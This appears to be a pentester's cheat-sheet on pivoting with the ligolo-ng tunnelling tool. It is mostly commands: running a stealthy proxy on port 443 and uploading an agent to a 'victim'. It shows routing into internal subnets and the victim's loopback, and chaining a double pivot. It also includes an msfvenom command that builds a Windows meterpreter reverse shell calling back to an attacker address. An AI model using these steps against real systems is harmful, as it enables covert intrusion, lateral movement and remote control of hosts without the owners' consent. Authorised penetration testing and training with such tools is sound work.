IS another wonderful tool for pivoting that resembles SSHuttle where traffic is sent TCP/UDP or ICMP via an extra Interface, basically as an VPN would do. It's very powerful cause it's dynamic and you can reach all ports available, you don't need to use proxychains as it works direct via Interface, plus you have a C2 kind of server where you can manage several connections all in once.
Reference: https://github.com/nicocha30/ligolo-ng


# How to use it?
1)Setup the Server on you attacking machine(Linux)
Download the latest server binary for your machine.
Setup a new interface that will be used to route the traffic:
```
sudo ip tuntap add user millycash mode tun ligolo
sudo ip link set ligolo up
```
2)Run the Proxy server on you machine (will auto-negotiate letsencrytp cert and 443 for being stealthy on other FW)
(if for some reason it fails on binding you can use **-selfcert**  instead but less secure!)
```
./proxy -autocert
```
3)Upload the agent on the victim(no root or Admin is needed to run correctly the agent)
4)Connect the agent to proxy server on the victim(ignore self-signed errors)
 `./agent -connect PROXYSERVERIP:11601 -ignore-cert`
5)This should tell you that a connection is coming, you can choose by using session `<ID>`
6)Check the IP settings by writing **ifconfig**(from a session selected)
7)Setup the routing needed (use only if the victim have a second NIC that your are trying to reach via pivot, otherwise skip!)
`sudo ip route add IP/SUBNET dev ligolo`
8)Start the server(in Ligolo Proxy)
`start`
9)Now you should be able to reach the subnet from step 7 without proxychain or similar :)


# Local PortFW
If you want to reach internal ports aka 127.0.0.1 on the victim and perform a portfw you can
```
sudo ip route add 240.0.0.1/32 dev ligolo
```
(Adding this hard coded IP into ligono NIC routing table will forward all the traffic towards the loop-back address on the victim!)


# Reverse shells
(aka when you want a connection back from a double step)
On the agent create the listener port for reverse socks forward: 
```
[Agent : nchatelain@nworkstation] Â» listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
```
### Create the reverse meterpreter shell:
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=172.16.8.120 LPORT=1234 -f exe -o reverse.exe
```
(In meterpretet set port as **4321** and ip as ligolo IF)


# Double pivot
(new tun is needed unfortunately!)
Create a new tunnel:
```
sudo ip tuntap add user millycash mode tun ligolo2
sudo ip link set ligolo2 up
sudo ip route add IP/SUBNET dev ligolo2
```
Setup a listener in proxy server that goes back to the server port itself:
```
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
```
On the victim invoke a new shell:
```
./agent.exe -connect PIVOTINTERNALIP:11601 -ignore-cert
```
On the proxy 
```
session [choose the new session]
start --tun ligolo2
This should get you back a shell!
```